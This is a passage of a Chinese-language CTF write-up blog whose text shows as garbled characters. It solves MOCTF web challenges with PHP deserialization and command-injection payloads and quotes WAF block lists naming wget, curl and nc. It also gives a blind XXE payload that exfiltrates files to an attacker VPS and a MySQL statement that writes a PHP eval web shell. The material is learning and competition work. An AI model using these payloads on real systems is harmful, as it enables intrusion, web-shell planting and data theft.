empty,you lose~&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæœ¬åœ°æ„é€ ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bag</span>=<span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;AWM&quot;</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str=&quot;You got the airdrop&quot;;</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line"> <span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sheldon</span>();</span><br><span class="line"> <span class="variable">$temp</span>-&gt;bag = <span class="string">&quot;win.php &amp;&amp; cat waf.php &amp;&amp; index&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>)));</span><br></pre></td></tr></table></figure><p>ç„¶åè®°å¾—æŠŠå±æ€§æ•°é‡æ”¹ä¸€ä¸‹ç»•__wakeup æœ¬æ¥æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A2%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¹æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A31%3A%22win.php+%26%26+cat+waf.php+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>å¾—åˆ°waf.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//$black = [];</span></span><br><span class="line">    <span class="variable">$black</span> = <span class="keyword">array</span>(<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;comm&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;mv&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%0d&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;ps&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;ifconfig&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;curl&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨\ç»•è¿‡waf æ¯”å¦‚ç”¨l\sç»•è¿‡ls ç„¶åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6001/?LandIn=school&amp;&amp;pubg=O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A23%3A%22win.php+%26%26+l%5Cs+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class.php</span><br><span class="line">class.php.bak</span><br><span class="line">image</span><br><span class="line">index.php</span><br><span class="line">index.php.bak</span><br><span class="line">waf.php</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; find  pw\d&amp;&amp; index</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./class</span><br><span class="line">./class/flag.php</span><br><span class="line">./class/win.php</span><br><span class="line">./image</span><br><span class="line">./image/PUBG.jpg</span><br><span class="line">./index.php.bak</span><br><span class="line">./waf.php</span><br><span class="line">./class.php</span><br><span class="line">./class.php.bak</span><br><span class="line">./index.php</span><br></pre></td></tr></table></figure><p>ç„¶åcatä¸€ä¸‹å°±ok</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win.php &amp;&amp; cat ./class/flag.php&amp;&amp; index</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//moctf&#123;Try_Learn_PhP_h4rder&#125;</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç™»å½•ä¸€å“ˆ">ç™»å½•ä¸€å“ˆ</h3><p>é¦–å…ˆ.gitæ³„æ¼,githackä¸€æ³¢ index.phpçš„ä¸»è¦ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:./index.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.phpçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="string">&quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flag == <span class="variable language_">$this</span>-&gt;name)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wow,this is flag:&quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°sessionçš„åºåˆ—åŒ–å¤„ç†å’Œååºåˆ—åŒ–å¤„ç†ä¸åŒ,æ‰€ä»¥å¯ä»¥åˆ©ç”¨ä¸€ä¸‹,å…·ä½“å‚è€ƒ <a href="http://www.jb51.net/article/107101.htm">http://www.jb51.net/article/107101.htm</a> ç„¶åæ³¨æ„flag.phpé‡Œé¢æœ‰ä¸ª $this-&gt;flag == $this-&gt;name é‚£ä¹ˆå¯ä»¥ç”¨å¼•ç”¨ç»•è¿‡ <span class="math inline">\(this-&gt;name = &amp;\)</span>this-&gt;flag ç„¶ååºåˆ—åŒ–,ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MOCTF</span>();</span><br><span class="line"><span class="variable">$temp</span> -&gt; name = &amp;<span class="variable">$temp</span>-&gt;flag;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ <code>O:5:"MOCTF":2:&#123;s:4:"flag";N;s:4:"name";R:2;&#125;</code> ç„¶åæäº¤å¸å·ä¸ºO:5:"MOCTF":2:{s:4:"flag";N;s:4:"name";R:2;} å¯†ç éšæ„,ç„¶åè®¿é—®flag.php,æ‹¿åˆ°flag <code>Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125;</code></p><h3 id="pingä¸€ä¸‹å¥½å—">pingä¸€ä¸‹å¥½å—</h3><p>å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®,ä¸€é“é¢˜å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ é¦–å…ˆceye.ioäº†è§£ä¸€ä¸‹ æ³¨å†Œä¸€ä¸ªå·,ç„¶åé‡Œé¢æœ‰æ”»å‡»çš„payload ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¤§ç¥çš„æ–¹æ³•ä¸è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`lsbase64`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘å°±ä¸è¡Œ... åæ¥æƒ³äº†ä¸ªåŠæ³•,æ—¢ç„¶å‘½ä»¤å¯ä»¥æ‰§è¡Œ,é‚£ä¹ˆæˆ‘ç›´æ¥æŠŠå¾—åˆ°çš„å›æ˜¾å†™åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸å°±å¥½äº† æ‰€ä»¥æˆ‘å°±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls&gt;123.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ–‡ä»¶ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">123.txt</span><br><span class="line">apache2</span><br><span class="line">css</span><br><span class="line">exec.php</span><br><span class="line">fhnrwlnbjvf.php</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure><p>ç„¶åå†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat fhnrwlnbjvf.php&gt;321.txt`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p>å»è®¿é—®ä¸€ä¸‹321.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&quot;moctf&#123;dfa10ff1bd9872cda1d408f07eb66394&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥æ‰“ç®—ç”¨sed -n -p1æ¥æå–çš„,ä½†æ˜¯-è¢«è¿‡æ»¤äº†...å¾ˆæƒ¨... çœ‹å®Œè¿™é“é¢˜è¿˜é¡ºä¾¿ç†è§£äº†ä¹‹å‰hctfçš„é‚£é“oob,ä¸é”™ä¸é”™ å™¢å™¢å¯¹äº†,æŠŠæºç æ”¾ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$target</span>);</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;python&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bash&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nc&#x27;</span> =&gt;<span class="string">&#x27;&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$target</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cmd</span> != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;exec success&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ›´æ–°">2.22æ›´æ–°</h4><h3 id="å­—ç¬¦ä¸²å¤„ç†">å­—ç¬¦ä¸²å¤„ç†</h3><p>è¿™é“é¢˜å•Š...çœŸæ˜¯æƒ¨åˆ°çˆ†ç‚¸,é¢˜ç›®æç¤ºçš„æ˜¯application/xml,ç„¶åclient-ip= localhost, å°±å¾ˆæ˜æ˜¾æ˜¯xxe,ä½†æ˜¯æˆ‘å¹¶ä¸ä¼š,çœ‹äº†å¤§ä½¬çš„åšå®¢ä¹‹å,è‡ªå·±è¯•ç€å†™äº†ä¸€ä¸ªblind xxeçš„payload ä½†æ˜¯ä»æ¥éƒ½æ²¡æœ‰æˆåŠŸè¿‡,æ‰€ä»¥è¿™ç¯‡æ–‡ç« æ‹–åˆ°ç°åœ¨è¿˜æ²¡å‘... è™½ç„¶ç°åœ¨é¢˜ç›®å·²ç»å…³æ‰äº†,ä½†æ˜¯è¿˜æ˜¯æŠŠpayloadç»™å‘ä¸€ä¸‹å§,è™½ç„¶è¿™ä¸ªpayloadæ˜¯hgameé‡Œçš„payload,ä¸è¿‡è‡ªå·±ä¿®æ”¹ä¸€ä¸‹xmlæ–‡ä»¶å°±ok(å…¶å®å«dtdæ›´å¥½ä¸€ç‚¹),è¿™é‡Œç»™å‡ºhgameçš„**ä¹¦åº—é‚£é“é¢˜çš„è§£æ³•</p><h4 id="æµ‹è¯•ç‰ˆ">æµ‹è¯•ç‰ˆ:</h4><p>é¦–å…ˆæœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªevil.xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;1111&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://ä½ çš„vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>ç„¶å xxe.phpçš„æ–‡ä»¶å†…å®¹æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åpostçš„å†…å®¹æ˜¯</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ä½ çš„vps/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨vpsä¸Šæ”¶åˆ°æ•°æ®,1.txté‡Œé¢å°±æ˜¯1111 å¦‚æœæŠŠpayloadé‡Œçš„ä¸œè¥¿æ”¹æˆè¯·æ±‚çš„è¯,é‚£ä¹ˆå°±æ˜¯æŠŠevil.xmlæ”¹æˆ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///a/b&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://ä½ çš„vps/xxe.php?f=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥è¯»å–åˆ°æœåŠ¡å™¨ä¸Šçš„a/bçš„æ–‡ä»¶å¹¶å­˜åˆ°ä½ vpsä¸Šå½“å‰ç›®å½•çš„1.txtä¸‹ ç„¶åå°±æ‹¿åˆ°flag: hgame{Xxe_v3ry_funny!!!!}</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysqlçš„è¡¥å……å­¦ä¹ </title>
      <link href="/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä»¥å‰å…³äºmysqlåªä¼šææ•°æ®,å¹¶ä¸ä¼šå¤„ç†æ–‡ä»¶å’Œææƒ,è¿™é‡Œæ•´ç†ä¸€ä¸‹å­¦ä¹ åˆ°çš„æ–°å§¿åŠ¿</p><h3 id="load_file">load_file</h3><p>å…¶å®è¿™ä¸ªè¯´èµ·æ¥æ˜¯éƒ½çŸ¥é“,ä½†æ˜¯ä»¥å‰å®éªŒçš„æ—¶å€™æ€»æ˜¯å¤±è´¥.... ä»Šå¤©å†æ¬¡å°è¯•,å‘ç°è¿˜æ˜¯ä¸è¡Œ,load_fileçš„æ—¶å€™æ€»æ˜¯è¿”å›null,å¦‚å›¾ <img src="/images/2018/02/sql_1.png" alt="blacsheep" /> ç„¶åè¯•å›¾å†™å…¥æ–‡ä»¶çš„æ—¶å€™å¼¹å‡ºäº†<img src="/images/2018/02/sql_2.png" alt="blacsheep" /> ç„¶åç™¾åº¦äº†ä¸€ç•ª,æ”¹äº†ä¸€ä¸‹mysqlçš„è®¾ç½® åœ¨mysql.iniæœ€ååŠ äº†ä¸€å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æˆåŠŸçš„è¯»å†™æ–‡ä»¶äº†(æœ¬èº«mysqlæ˜¯rootæƒé™) <img src="/images/2018/02/sql_3.png" alt="blacsheep" /> åŒæ ·ä¹Ÿå¯ä»¥å†™shell,æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into dumpfile &quot;D://123.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/02/sql_4.png" alt="blacsheep" /> okok,åŸºç¡€å°±åˆ°è¿™é‡Œ,ä¸‹é¢æ˜¯å…³äºmysqlçš„ææƒ</p><h3 